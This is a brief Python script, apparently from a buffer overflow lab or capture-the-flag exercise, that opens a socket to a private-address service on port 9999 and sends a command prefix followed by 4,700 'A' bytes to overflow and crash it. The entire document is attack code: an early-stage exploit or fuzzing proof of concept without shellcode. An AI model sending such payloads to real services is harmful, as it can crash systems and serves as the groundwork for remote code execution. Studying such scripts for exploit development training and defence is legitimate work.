#!/usr/bin/python3
import socket

host, port = "10.10.134.46", 9999

cmd = b"NVM \x0a "

payload = b"".join([
            cmd,
            b"A" * 4700,
        ])

with socket.socket() as s:
    s.connect((host,port))
    s.send(payload)

